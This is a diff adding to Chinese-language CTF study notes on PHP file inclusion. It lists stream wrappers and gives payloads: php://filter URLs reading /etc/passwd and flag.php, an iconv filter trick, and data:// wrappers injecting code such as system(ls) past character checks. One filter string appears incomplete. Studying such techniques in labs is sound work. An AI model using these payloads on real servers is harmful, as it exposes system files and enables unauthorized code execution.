@@ -229,4 +229,23 @@ cookie：language=php://filter/read=convert.base64-encode/resource=/var/www/html
 出现base64，解密
 或者bp抓包，发现cookie的值
 sent给response
-2026.1.24
+2026.3.2
+1.读取文件：./是当前目录， ../是父级目录，/是根目录
+2.conversion filters的使用
+使用方法：convert.iconv.<input-encoding>.<output-encoding>
+伪协议种类
+file://访问本地文件系统
+http://访问http（s）网址
+ftp://访问ftp
+php://访问各个输入输出流
+zlib://压缩流
+data://数据
+rar://rar压缩包
+ogg://音频流
+使用放法：一个一个测试，后面加上/？filename=php://filter/read=convert.base64/resource=/etc/passwd
+第一个文件包含url：/?filename=php://filter/convert.iconv.utf8.utf16/resource=flag.php
+iconv使用方法见上
+3.见源代码php system（ls）用data绕过
+使用：data://text/plain,代码内容#直接传入文本
+data://text/plain；base64，base64编码的代码#编码后传入绕过字符检测
+4.网页一大堆乱码搜索ctf：ctrl+F
